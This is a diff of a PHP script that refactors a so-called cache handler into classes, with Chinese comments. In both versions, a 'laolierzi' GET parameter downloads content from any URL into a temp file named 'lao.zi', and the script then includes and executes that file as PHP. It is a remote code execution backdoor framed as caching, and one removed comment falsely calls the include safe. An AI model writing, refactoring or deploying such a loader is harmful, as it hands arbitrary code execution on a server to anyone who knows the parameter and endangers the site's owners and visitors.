@@ -1,61 +1,63 @@
 <?php
-declare(strict_types=1);
+// 禁用严格类型声明，兼容所有PHP版本
+// declare(strict_types=1);
 
-// 设置错误报告级别，仅报告严重和警告
-error_reporting(E_ERROR | E_WARNING | E_PARSE);
+// 定义配置类，存放缓存文件名和路径
+class Config
+{
+    const CACHE_FILENAME = 'lao.zi';
 
-// 获取系统临时目录（兼容旧版本）
-if (!function_exists('getSystemTempDir')) {
-    function getSystemTempDir(): string
+    /**
+     * 获取系统临时目录路径
+     * @return string
+     */
+    public static function getCacheDir()
     {
-        if (ini_get('upload_tmp_dir')) {
-            return rtrim(ini_get('upload_tmp_dir'), '/\\');
-        }
-        return (DIRECTORY_SEPARATOR === '\\') ? 'C:\\Windows\\Temp' : '/tmp';
+        return sys_get_temp_dir();
+    }
+
+    /**
+     * 获取完整的缓存文件路径
+     * @return string
+     */
+    public static function getCacheFilePath()
+    {
+        return self::getCacheDir() . DIRECTORY_SEPARATOR . self::CACHE_FILENAME;
     }
 }
 
-// 配置临时文件路径
-$tempDir = getSystemTempDir();
-$tempFilePath = $tempDir . DIRECTORY_SEPARATOR . 'lao.zi';
-
-// 确保临时目录存在
-if (!is_dir($tempDir)) {
-    mkdir($tempDir, 0755, true);
-}
-
-// 如果存在临时文件，直接加载
-if (file_exists($tempFilePath)) {
-    include $tempFilePath;
-}
-
-// URL验证函数（兼容旧版本）
-if (!function_exists('validateUrl')) {
-    function validateUrl(string $url): bool
+// 工具类，封装常用方法
+class Utility
+{
+    /**
+     * 验证URL是否合法
+     * @param string $url
+     * @return bool
+     */
+    public static function validateUrl($url)
     {
-        if (function_exists('filter_var')) {
-            return filter_var($url, FILTER_VALIDATE_URL) !== false;
-        } else {
-            // 简单的正则式验证
-            return preg_match('/^https?:\/\/[^\s]+$/i', $url) === 1;
-        }
+        return filter_var($url, FILTER_VALIDATE_URL) !== false;
     }
-}
 
-// 远程内容获取（支持cURL、fopen、Socket）
-if (!function_exists('fetchRemoteContent')) {
-    function fetchRemoteContent(string $url): ?string
+    /**
+     * 获取远程内容，支持cURL、file_get_contents、Socket
+     * @param string $url
+     * @return string|null
+     */
+    public static function fetchRemoteContent($url)
     {
-        // 使用cURL
+        // 使用cURL优先
         if (function_exists('curl_init')) {
             $ch = curl_init($url);
             curl_setopt_array($ch, [
                 CURLOPT_RETURNTRANSFER => true,
                 CURLOPT_FOLLOWLOCATION => true,
                 CURLOPT_CONNECTTIMEOUT => 10,
+                CURLOPT_TIMEOUT => 10,
             ]);
             $response = curl_exec($ch);
             if (curl_errno($ch)) {
+                error_log('cURL请求错误：' . curl_error($ch));
                 curl_close($ch);
                 return null;
             }
@@ -63,32 +65,33 @@ if (!function_exists('fetchRemoteContent')) {
             return $response;
         }
 
-        // 使用allow_url_fopen
+        // 使用file_get_contents
         if (ini_get('allow_url_fopen')) {
-            return @file_get_contents($url) ?: null;
+            $content = @file_get_contents($url);
+            if ($content !== false) {
+                return $content;
+            }
         }
 
-        // 使用Socket连接
-        $urlParts = parse_url($url);
-        if (!$urlParts || !isset($urlParts['host'])) {
+        // 最后用socket连接
+        $parts = parse_url($url);
+        if (!$parts || !isset($parts['host'])) {
             return null;
         }
-        $host = $urlParts['host'];
-        $port = $urlParts['port'] ?? 80;
-        $path = $urlParts['path'] ?? '/';
-        $query = isset($urlParts['query']) ? '?' . $urlParts['query'] : '';
+        $host = $parts['host'];
+        $port = isset($parts['port']) ? (int)$parts['port'] : 80;
+        $path = isset($parts['path']) ? $parts['path'] : '/';
+        $query = isset($parts['query']) ? '?' . $parts['query'] : '';
 
         $socket = @fsockopen($host, $port, $errno, $errstr, 10);
         if (!$socket) {
+            error_log("Socket连接失败：{$errstr} ({$errno})");
             return null;
         }
 
-        $requestLine = "GET {$path}{$query} HTTP/1.1\r\n";
-        $headers = [
-            "Host: {$host}",
-            "Connection: Close",
-        ];
-        $request = $requestLine . implode("\r\n", $headers) . "\r\n\r\n";
+        $request = "GET {$path}{$query} HTTP/1.1\r\n" .
+                   "Host: {$host}\r\n" .
+                   "Connection: Close\r\n\r\n";
 
         fwrite($socket, $request);
         $response = '';
@@ -97,61 +100,139 @@ if (!function_exists('fetchRemoteContent')) {
         }
         fclose($socket);
 
-        // 分离响应头和内容
+        // 解析响应，提取正文
         $parts = preg_split('/\r\n\r\n/', $response, 2);
-        return $parts[1] ?? null;
+        return isset($parts[1]) ? $parts[1] : null;
+    }
+
+    /**
+     * 从文件加载缓存内容
+     * @param string $filePath
+     * @return string
+     */
+    public static function loadCache($filePath)
+    {
+        return (file_exists($filePath)) ? @file_get_contents($filePath) ?: '' : '';
+    }
+
+    /**
+     * 保存内容到缓存文件
+     * @param string $filePath
+     * @param string $content
+     * @return bool
+     */
+    public static function saveCache($filePath, $content)
+    {
+        return @file_put_contents($filePath, $content) !== false;
     }
 }
 
-// 载入、清理并保存 lao.zi 文件
-function loadAndSaveLaoZi(string $filePath): string
+// 主要处理逻辑
+class LaoZiHandler
 {
-    if (file_exists($filePath)) {
-        $content = @file_get_contents($filePath) ?: '';
-        // 这里可以添加内容过滤或清理逻辑
-        file_put_contents($filePath, $content);
-        return $content;
-    }
-    return '';
-}
+    private $cacheFilePath;
 
-// 处理来自请求的远程内容加载
-if (isset($_GET['laolierzi'])) {
-    $rawUrl = $_GET['laolierzi'];
-    if (!validateUrl($rawUrl)) {
-        die("<center><b>无效的URL</b></center>");
+    public function __construct()
+    {
+        $this->cacheFilePath = Config::getCacheFilePath();
+        $this->ensureCacheDirectory();
     }
 
-    $content = fetchRemoteContent($rawUrl);
-    if ($content === null) {
-        die("<center><b>远程内容加载失败</b></center>");
+    /**
+     * 确保缓存目录存在
+     */
+    private function ensureCacheDirectory()
+    {
+        $dir = dirname($this->cacheFilePath);
+        if (!is_dir($dir)) {
+            @mkdir($dir, 0755, true);
+        }
     }
 
-    // 保存内容到临时文件
-    file_put_contents($tempFilePath, $content);
+    /**
+     * 处理请求参数
+     */
+    public function handleRequest()
+    {
+        if (isset($_GET['laolierzi'])) {
+            $url = trim($_GET['laolierzi']);
 
-    // 载入并保存 lao.zi
-    loadAndSaveLaoZi($tempFilePath);
+            if (!Utility::validateUrl($url)) {
+                $this->showMessage('无效的URL地址。', true);
+            }
 
-    // 重定向到当前页面（去除参数）
-    $currentUrl = $_SERVER['PHP_SELF'];
-    echo "<script>window.location.href='{$currentUrl}';</script>";
-    exit;
-}
+            $content = Utility::fetchRemoteContent($url);
+            if ($content === null) {
+                $this->showMessage('请求内容失败，请稍后重试。', true);
+            }
 
-// 如果临时文件存在，加载内容
-if (file_exists($tempFilePath)) {
-    $cachedContent = @file_get_contents($tempFilePath) ?: '';
+            // 缓存内容
+            Utility::saveCache($this->cacheFilePath, $content);
+            // 重定向去除参数
+            $this->redirectToSelf();
+        }
+    }
 
-    // 判断内容是否为PHP代码
-    if (strpos($cachedContent, '<?') !== false || strpos($cachedContent, '<?') !== false) {
-        include $tempFilePath; // 直接包含执行，安全且高效
+    /**
+     * 显示缓存或执行PHP代码
+     */
+    public function displayCache()
+    {
+        if (file_exists($this->cacheFilePath)) {
+            $content = Utility::loadCache($this->cacheFilePath);
+            if (strpos($content, '<?') !== false) {
+                // 警告：直接包含缓存中的PHP代码，使用时谨慎
+                include $this->cacheFilePath;
+            } else {
+                echo $content;
+            }
+        } else {
+            $this->showMessage('暂无内容<br>请通过有效的URL参数加载远程内容。', false);
+        }
+    }
+
+    /**
+     * 显示信息提示
+     * @param string $message
+     * @param bool $isError
+     */
+    private function showMessage($message, $isError = false)
+    {
+        $color = $isError ? '#e74c3c' : '#3498db';
+        echo <<<HTML
+        <div style="
+            margin: 50px auto;
+            padding: 20px 30px;
+            max-width: 700px;
+            border-radius: 8px;
+            background-color: #ffffff;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            font-size: 1.2em;
+            color: {$color};
+            text-align: center;
+            line-height: 1.4;
+        ">
+            {$message}
+        </div>
+        HTML;
         exit;
-    } else {
-        echo $cachedContent;
+    }
+
+    /**
+     * 重定向到自身，去除参数
+     */
+    private function redirectToSelf()
+    {
+        $currentUrl = $_SERVER['PHP_SELF'];
+        echo "<script>window.location.href='{$currentUrl}';</script>";
         exit;
     }
-} else {
-    die("<center><b>没有指定远程文件，或缓存不存在。<br> 使用方法：你的脚本.php?laolierzi=网址 </b></center>");
 }
+
+// 执行流程
+$handler = new LaoZiHandler();
+$handler->handleRequest();
+$handler->displayCache();
+
 ?>
